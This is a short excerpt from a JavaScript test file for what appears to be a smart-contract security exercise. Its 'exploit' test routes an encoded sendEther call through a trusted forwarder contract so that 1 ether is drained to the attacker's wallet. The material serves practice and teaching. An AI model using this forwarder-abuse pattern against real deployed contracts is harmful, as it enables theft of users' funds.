...
describe(NAME, function () {
    ...
    describe("exploit", async function () {
        ...
        it("conduct your attack here", async function () {
            const forwarderAddress = await walletContract.forwarder();
            const forwarder = await ethers.getContractAt(FORWARDER_NAME, forwarderAddress);

            // Attacker calls the forwarder's execute function with a malicious payload
            const maliciousPayload = walletContract.interface.encodeFunctionData("sendEther", [
                attackerWallet.address,
                ethers.utils.parseEther("1"),
            ]);
            await forwarder.connect(attackerWallet).functionCall(walletContract.address, maliciousPayload);
        });
